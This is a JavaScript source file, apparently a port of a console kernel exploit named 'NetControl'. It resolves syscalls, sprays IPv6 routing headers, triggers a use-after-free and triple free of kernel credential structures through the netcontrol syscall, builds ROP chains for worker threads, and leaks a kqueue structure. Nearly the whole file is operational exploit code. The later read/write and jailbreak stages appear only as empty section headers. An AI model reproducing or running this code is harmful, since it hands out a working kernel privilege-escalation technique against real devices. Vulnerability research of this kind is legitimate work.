include('inject.js')
include('globals.js')
include('util.js')

// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// ============================================================================
utils.notify('ð\x9F\x92\xA9 NetControl ð\x9F\x92\xA9')

// NetControl constants
var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

// Extract required syscalls from syscalls.map
var kapi = {
  read_lo: 0,
  read_hi: 0,
  read_found: false,
  write_lo: 0,
  write_hi: 0,
  write_found: false,
  close_lo: 0,
  close_hi: 0,
  close_found: false,
  setuid_lo: 0,
  setuid_hi: 0,
  setuid_found: false,
  dup_lo: 0,
  dup_hi: 0,
  dup_found: false,
  socket_lo: 0,
  socket_hi: 0,
  socket_found: false,
  socketpair_lo: 0,
  socketpair_hi: 0,
  socketpair_found: false,
  recvmsg_lo: 0,
  recvmsg_hi: 0,
  recvmsg_found: false,
  setsockopt_lo: 0,
  setsockopt_hi: 0,
  setsockopt_found: false,
  getsockopt_lo: 0,
  getsockopt_hi: 0,
  getsockopt_found: false,
  netcontrol_lo: 0,
  netcontrol_hi: 0,
  netcontrol_found: false,
  mprotect_lo: 0,
  mprotect_hi: 0,
  mprotect_found: false
}

// Get syscall addresses from already-scanned syscalls.map
if (syscalls.map.has(0x03)) {
  var addr = syscalls.map.get(0x03)
  kapi.read_lo = addr.lo()
  kapi.read_hi = addr.hi()
  kapi.read_found = true
}
if (syscalls.map.has(0x04)) {
  var addr = syscalls.map.get(0x04)
  kapi.write_lo = addr.lo()
  kapi.write_hi = addr.hi()
  kapi.write_found = true
}
if (syscalls.map.has(0x06)) {
  var addr = syscalls.map.get(0x06)
  kapi.close_lo = addr.lo()
  kapi.close_hi = addr.hi()
  kapi.close_found = true
}
if (syscalls.map.has(0x17)) {
  var addr = syscalls.map.get(0x17)
  kapi.setuid_lo = addr.lo()
  kapi.setuid_hi = addr.hi()
  kapi.setuid_found = true
}
if (syscalls.map.has(0x29)) {
  var addr = syscalls.map.get(0x29)
  kapi.dup_lo = addr.lo()
  kapi.dup_hi = addr.hi()
  kapi.dup_found = true
}
if (syscalls.map.has(0x61)) {
  var addr = syscalls.map.get(0x61)
  kapi.socket_lo = addr.lo()
  kapi.socket_hi = addr.hi()
  kapi.socket_found = true
}
if (syscalls.map.has(0x87)) {
  var addr = syscalls.map.get(0x87)
  kapi.socketpair_lo = addr.lo()
  kapi.socketpair_hi = addr.hi()
  kapi.socketpair_found = true
}
if (syscalls.map.has(0x1B)) {
  var addr = syscalls.map.get(0x1B)
  kapi.recvmsg_lo = addr.lo()
  kapi.recvmsg_hi = addr.hi()
  kapi.recvmsg_found = true
}
if (syscalls.map.has(0x69)) {
  var addr = syscalls.map.get(0x69)
  kapi.setsockopt_lo = addr.lo()
  kapi.setsockopt_hi = addr.hi()
  kapi.setsockopt_found = true
}
if (syscalls.map.has(0x76)) {
  var addr = syscalls.map.get(0x76)
  kapi.getsockopt_lo = addr.lo()
  kapi.getsockopt_hi = addr.hi()
  kapi.getsockopt_found = true
}
if (syscalls.map.has(0x63)) {
  var addr = syscalls.map.get(0x63)
  kapi.netcontrol_lo = addr.lo()
  kapi.netcontrol_hi = addr.hi()
  kapi.netcontrol_found = true
}
if (syscalls.map.has(0x4A)) {
  var addr = syscalls.map.get(0x4A)
  kapi.mprotect_lo = addr.lo()
  kapi.mprotect_hi = addr.hi()
  kapi.mprotect_found = true
}

// Check required syscalls
if (!kapi.socket_found || !kapi.socketpair_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found || !kapi.netcontrol_found || !kapi.read_found || !kapi.write_found || !kapi.recvmsg_found) {
  log('ERROR: Required syscalls not found')
  log(' socket: ' + kapi.socket_found)
  log(' socketpair: ' + kapi.socketpair_found)
  log(' setsockopt: ' + kapi.setsockopt_found)
  log(' getsockopt: ' + kapi.getsockopt_found)
  log(' close: ' + kapi.close_found)
  log(' netcontrol: ' + kapi.netcontrol_found)
  log(' read: ' + kapi.read_found)
  log(' write: ' + kapi.write_found)
  log(' recvmsg: ' + kapi.recvmsg_found)
  log(' setuid: ' + kapi.setuid_found)
  throw new Error('Required syscalls not found')
}

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// ============================================================================

log('=== NetControl ===')

// Create syscall wrappers using fn.create()
var socket = fn.create(0x61, ['bigint', 'bigint', 'bigint'], 'bigint')
var socketpair = fn.create(0x87, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var setsockopt = fn.create(0x69, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var getsockopt = fn.create(0x76, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var close_sys = fn.create(0x06, ['bigint'], 'bigint')
var setuid = fn.create(0x17, ['bigint'], 'bigint')
var dup_sys = fn.create(0x29, ['bigint'], 'bigint')
var recvmsg = fn.create(0x1B, ['bigint', 'bigint', 'bigint'], 'bigint')
var netcontrol_sys = fn.create(0x63, ['int', 'int', 'bigint', 'int'], 'bigint')
var read_sys = fn.create(0x03, ['bigint', 'bigint', 'bigint'], 'bigint')
var write_sys = fn.create(0x04, ['bigint', 'bigint', 'bigint'], 'bigint')
var mmap_sys = fn.create(0x1DD, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var setuid_sys = fn.create(0x17, ['int'], 'bigint')

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper = syscalls.map.get(0x03)
var write_wrapper = syscalls.map.get(0x04)
var recvmsg_wrapper = syscalls.map.get(0x1B)

// Threading using scePthreadCreate
// int32_t scePthreadCreate(OrbisPthread *, const OrbisPthreadAttr *, void*(*F)(void*), void *, const char *)
var scePthreadCreate_addr = libc_addr.add(new BigInt(0, 0x340))
var scePthreadCreate = fn.create(scePthreadCreate_addr, ['bigint', 'bigint', 'bigint', 'bigint', 'string'], 'bigint')

log('Using scePthreadCreate at: ' + scePthreadCreate_addr.toString())

// Define thr_param structure
var ThrParam = struct.create('ThrParam', [
  { type: 'Uint64*', name: 'start_func' },
  { type: 'Uint64*', name: 'arg' },
  { type: 'Uint64*', name: 'stack_base' },
  { type: 'Uint64', name: 'stack_size' },
  { type: 'Uint64*', name: 'tls_base' },
  { type: 'Uint64', name: 'tls_size' },
  { type: 'Uint64*', name: 'child_tid' },
  { type: 'Uint64*', name: 'parent_tid' },
  { type: 'Int32', name: 'flags' },
  { type: 'Uint64*', name: 'rtp' }
])

log('ThrParam struct size: ' + ThrParam.sizeof)

// Pre-allocate all buffers once (reuse throughout exploit)
var store_addr = mem.malloc(0x100)
var rthdr_buf = mem.malloc(UCRED_SIZE)
var optlen_buf = mem.malloc(8)

log('store_addr: ' + store_addr.toString())
log('rthdr_buf: ' + rthdr_buf.toString())

// Storage for IPv6 sockets
var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
var socket_count = 0

log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets using socket()
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var fd = socket(AF_INET6, SOCK_STREAM, 0)

  if (fd === -1) {
    log('ERROR: socket() failed at index ' + i)
    break
  }

  ipv6_sockets[i] = fd
  socket_count++
}

log('Created ' + socket_count + ' IPv6 sockets')

if (socket_count !== IPV6_SOCK_NUM) {
  log('FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}

log('Initializing pktopts on all sockets...')

// Initialize pktopts by calling setsockopt with NULL buffer
var init_count = 0
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var ret = setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)

  if (ret !== -1) {
    init_count++
  }
}

log('Initialized ' + init_count + ' pktopts')

if (init_count === 0) {
  log('FAILED: No pktopts initialized')
  throw new Error('Failed to initialize pktopts')
}

// ============================================================================
// STAGE 2: Spray routing headers
// ============================================================================

// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.write1(rthdr_buf, 0) // ip6r_nxt
mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len) // ip6r_len
mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0) // ip6r_type
mem.write1(rthdr_buf.add(new BigInt(0, 3)), rthdr_len >> 1) // ip6r_segleft
var rthdr_size = (rthdr_len + 1) << 3

log('Built routing header template (size=' + rthdr_size + ' bytes)')

// Spray routing headers with tagged values across all sockets
log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')

for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
  mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)

  // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
}

log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')

// ============================================================================
// STAGE 3: Trigger ucred triple-free and find twins/triplet
// ============================================================================

// Allocate buffers
var set_buf = mem.malloc(8)
var clear_buf = mem.malloc(8)
var leak_rthdr_buf = mem.malloc(UCRED_SIZE)
var leak_len_buf = mem.malloc(8)
var tmp_buf = mem.malloc(8)

// Global variables
var twins = [-1, -1]
var triplets = [-1, -1, -1]
var uaf_sock = -1

// Try socketpair using fn.create() approach
log('Attempting socketpair...')

var sp_buf = mem.malloc(8)
log('Allocated socketpair buffer at: ' + sp_buf.toString())

socketpair(1, 1, 0, sp_buf)

var iov_ss0 = mem.read4(sp_buf).lo() & 0xFFFFFFFF
var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF

if (iov_ss0 === 0xFFFFFFFF || iov_ss1 === 0xFFFFFFFF) {
  var errno_val = _error()
  var errno_int = mem.read4(errno_val)
  var errno_str = strerror(errno_int)
  log('ERROR: socketpair failed')
  log('  errno: ' + errno_int + ' (' + errno_str + ')')
  log('  fds: [' + iov_ss0 + ', ' + iov_ss1 + ']')
  throw new Error('socketpair failed with errno ' + errno_int)
}

log('Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')

// Prepare msg_iov buffer (iov_base=1 will become cr_refcnt)
var msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (var i = 0; i < MSG_IOV_NUM; i++) {
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE)), new BigInt(0, 1))
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
}

// Spawn IOV workers if socketpair succeeded
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  log('Spawning ' + IOV_THREAD_NUM + ' IOV worker threads...')

  // Get syscall wrappers
  var recvmsg_wrapper = syscalls.map.get(0x1B)
  var write_wrapper = syscalls.map.get(0x04)
  var thr_exit_wrapper = syscalls.map.get(0x1AF)
  var thr_new = fn.create(0x1C7, ['bigint', 'bigint'], 'bigint')

  // Prepare msghdr for recvmsg
  var msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)
  mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)

  // Build worker ROP chain: unrolled loop doing many recvmsg calls
  // (Can't do true infinite loop in ROP without stack pivot gadgets)
  var worker_rop = []
  var recvmsg_iterations = 1000  // Enough for all spray attempts

  for (var iter = 0; iter < recvmsg_iterations; iter++) {
    worker_rop.push(gadgets.POP_RDI_RET)
    worker_rop.push(new BigInt(iov_ss0))
    worker_rop.push(gadgets.POP_RSI_RET)
    worker_rop.push(msg_hdr)
    worker_rop.push(gadgets.POP_RDX_RET)
    worker_rop.push(BigInt.Zero)
    worker_rop.push(recvmsg_wrapper)
  }

  // Exit after all iterations
  worker_rop.push(gadgets.POP_RDI_RET)
  worker_rop.push(BigInt.Zero)
  worker_rop.push(thr_exit_wrapper)

  log('Worker ROP chain built: ' + worker_rop.length + ' gadgets (' + recvmsg_iterations + ' recvmsg iterations)')

  // Spawn workers with unrolled ROP chains
  var stack_size = 0x20000  // 128KB stack for large ROP chain
  for (var w = 0; w < IOV_THREAD_NUM; w++) {
    // Allocate stack and write ROP chain
    var thread_stack = mem.malloc(stack_size)
    var stack_top = thread_stack.add(new BigInt(0, stack_size))

    // Write ROP chain in reverse order (stack grows down)
    for (var i = worker_rop.length - 1; i >= 0; i--) {
      stack_top = stack_top.sub(new BigInt(0, 8))
      mem.write8(stack_top, worker_rop[i])
    }

    // Build thr_param
    var tls = mem.malloc(0x40)
    var child_tid = mem.malloc(8)
    var parent_tid = mem.malloc(8)
    var thr_param = mem.malloc(0x80)

    mem.write8(thr_param.add(new BigInt(0, 0x00)), gadgets.RET)
    mem.write8(thr_param.add(new BigInt(0, 0x08)), BigInt.Zero)
    mem.write8(thr_param.add(new BigInt(0, 0x10)), thread_stack)
    mem.write8(thr_param.add(new BigInt(0, 0x18)), new BigInt(0, stack_size))
    mem.write8(thr_param.add(new BigInt(0, 0x20)), tls)
    mem.write8(thr_param.add(new BigInt(0, 0x28)), new BigInt(0, 0x40))
    mem.write8(thr_param.add(new BigInt(0, 0x30)), child_tid)
    mem.write8(thr_param.add(new BigInt(0, 0x38)), parent_tid)

    var ret = thr_new(thr_param, new BigInt(0, 0x68))
    var ret_val = ret.lo() | (ret.hi() << 32)
    if (ret_val !== 0) {
      throw new Error('thr_new failed for worker ' + w + ': ' + ret.toString())
    }
  }

  log('All ' + IOV_THREAD_NUM + ' workers spawned (blocking on recvmsg)')
}

// ============================================================================
// Trigger ucred UAF setup
// ============================================================================
log('=== Setting up ucred UAF ===')

// Create dummy socket to register and close
var dummy_sock = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
log('Created dummy socket: ' + dummy_sock)

// Register dummy socket with netcontrol
var set_buf = mem.malloc(8)
mem.write4(set_buf, dummy_sock)
netcontrol_sys(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)
log('Registered dummy socket')

// Close dummy socket
close_sys(dummy_sock)
log('Closed dummy socket')

// Allocate new ucred
setuid_sys(1)

// Reclaim the file descriptor
uaf_sock = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
log('Created uaf_sock: ' + uaf_sock)

// Free the previous ucred (now uaf_sock's f_cred has cr_refcnt=1)
setuid_sys(1)

// Unregister and free the file and ucred
var clear_buf = mem.malloc(8)
mem.write4(clear_buf, uaf_sock)
netcontrol_sys(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)
log('Unregistered uaf_sock')

// Set cr_refcnt back to 1 with IOV spray (32 iterations)
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  log('Resetting cr_refcnt with IOV spray...')
  var spray_tmp = mem.malloc(1)
  mem.write1(spray_tmp, 0x42)
  var ws = fn.create(syscalls.map.get(0x04), ['int', 'bigint', 'int'], 'bigint')

  // Trigger 32 IOV sprays via workers
  for (var reset_i = 0; reset_i < 32; reset_i++) {
    ws(iov_ss1, spray_tmp, 1)  // Unblock one worker's recvmsg
  }
  log('cr_refcnt reset complete (32 IOV sprays triggered)')
}

// Double free ucred (only dup works - doesn't check f_hold)
var dup_fd = dup_sys(uaf_sock)
close_sys(dup_fd)
log('Double freed ucred via close(dup(uaf_sock))')

// Find twins - two sockets sharing same routing header
log('Finding twins...')
var found_twins = false
var twin_timeout = TWIN_TRIES

while (twin_timeout-- > 0 && !found_twins) {
  // Re-spray tags across all sockets
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
    setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  }

  // Check for twins
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
    getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

    var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
    var j = val & 0xFFFF

    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
      twins[0] = i
      twins[1] = j
      found_twins = true
      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
      break
    }
  }

  if (!found_twins && (twin_timeout % 1000 === 0)) {
    log('Twin search... (' + twin_timeout + ' remaining)')
  }
}

if (!found_twins) {
  throw new Error('Failed to find twins after ' + TWIN_TRIES + ' attempts')
}

// ============================================================================
// Triple-free setup
// ============================================================================
log('=== Triple-freeing ucred ===')

// Free one twin's rthdr
setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
log('Freed rthdr on socket[' + twins[1] + ']')

// Set cr_refcnt back to 1 by spraying IOV until first_int == 1
log('Spraying IOV to reset cr_refcnt for triple-free...')
var triplet_spray_attempts = 0
var max_triplet_spray = 50000

if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  var spray_tmp2 = mem.malloc(1)
  mem.write1(spray_tmp2, 0x43)
  var ws2 = fn.create(syscalls.map.get(0x04), ['int', 'bigint', 'int'], 'bigint')

  while (triplet_spray_attempts < max_triplet_spray) {
    // Trigger one IOV spray via worker
    ws2(iov_ss1, spray_tmp2, 1)

    // Check if reclaim succeeded
    mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
    getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

    var first_int = mem.read4(leak_rthdr_buf)
    if (first_int === 1) {
      log('IOV reclaim successful after ' + (triplet_spray_attempts + 1) + ' sprays (first_int = 1)')
      break
    }

    triplet_spray_attempts++
    if (triplet_spray_attempts % 1000 === 0) {
      log('Triple-free spray attempt ' + triplet_spray_attempts + '...')
    }
  }

  if (triplet_spray_attempts >= max_triplet_spray) {
    throw new Error('Failed to reclaim with IOV spray for triple-free')
  }
} else {
  throw new Error('No IOV workers available for triple-free spray')
}

var triplets = [-1, -1, -1]
triplets[0] = twins[0]

// Triple free ucred (second time)
log('Triple-freeing ucred (second time)...')
var dup_fd2 = dup_sys(uaf_sock)
close_sys(dup_fd2)
log('Triple-freed ucred via close(dup(uaf_sock))')

// Helper function to find triplet
function findTriplet(master, other) {
  var max_attempts = 50000
  var attempt = 0

  while (attempt < max_attempts) {
    // Spray rthdr on all sockets except master and other
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }
      mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
      setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
    }

    // Check for triplet by reading from master
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }

      mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
      getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

      var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
      var j = val & 0xFFFF

      if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
        return j
      }
    }

    attempt++
    if (attempt % 1000 === 0) {
      log('findTriplet attempt ' + attempt + '...')
    }
  }

  return -1
}

// Find triplet[1] - a third socket sharing the same rthdr
log('Finding triplet[1]...')
triplets[1] = findTriplet(triplets[0], -1)
if (triplets[1] === -1) {
  throw new Error('Failed to find triplet[1]')
}
log('Found triplet[1]: socket[' + triplets[1] + ']')

// Release one IOV spray
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  var rel_tmp = mem.malloc(1)
  mem.write1(rel_tmp, 0x44)
  var ws3 = fn.create(syscalls.map.get(0x04), ['int', 'bigint', 'int'], 'bigint')
  ws3(iov_ss1, rel_tmp, 1)
}

// Find triplet[2] - a fourth socket sharing the same rthdr
log('Finding triplet[2]...')
triplets[2] = findTriplet(triplets[0], triplets[1])
if (triplets[2] === -1) {
  throw new Error('Failed to find triplet[2]')
}
log('Found triplet[2]: socket[' + triplets[2] + ']')
log('Triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')

// ============================================================================
// Stage 4: Leak kqueue structure
// ============================================================================
log('=== Stage 4: Leaking kqueue ===')

// Free one rthdr to make room for kqueue
setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
log('Freed rthdr on socket[' + twins[1] + ']')

// Get kqueue syscall (0x16A = 362)
var kqueue_sys = fn.create(0x16A, [], 'int')

// Loop until we reclaim with kqueue structure
var kq_fd = -1
var kq_fdp = BigInt.Zero
var max_attempts = 100

for (var attempt = 0; attempt < max_attempts; attempt++) {
  // Create kqueue
  kq_fd = kqueue_sys()
  if (kq_fd < 0) {
    throw new Error('kqueue() failed')
  }

  // Leak with the other twin
  mem.write8(leak_len_buf, new BigInt(0, 0x100))
  getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

  // Check for kqueue signature at offset 0x08
  var sig = mem.read4(leak_rthdr_buf.add(new BigInt(0, 0x08)))
  if (sig === 0x1430000) {
    // Found kqueue! Extract kq_fdp at offset 0xA8
    kq_fdp = mem.read8(leak_rthdr_buf.add(new BigInt(0, 0xA8)))
    log('Found kqueue structure after ' + (attempt + 1) + ' attempts')
    log('kq_fdp: ' + kq_fdp.toString())
    break
  }

  // Not kqueue yet, close and retry
  close_sys(kq_fd)
}

if (kq_fdp.lo() === 0 && kq_fdp.hi() === 0) {
  throw new Error('Failed to leak kqueue after ' + max_attempts + ' attempts')
}

// Close kqueue to free the buffer
close_sys(kq_fd)
log('Closed kqueue fd ' + kq_fd)

// Cleanup buffers
mem.free(store_addr)
mem.free(rthdr_buf)
mem.free(optlen_buf)
mem.free(set_buf)
mem.free(clear_buf)
mem.free(leak_rthdr_buf)
mem.free(leak_len_buf)

// ============================================================================
// STAGE 4: Leak kqueue structure
// ============================================================================

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak
// ============================================================================
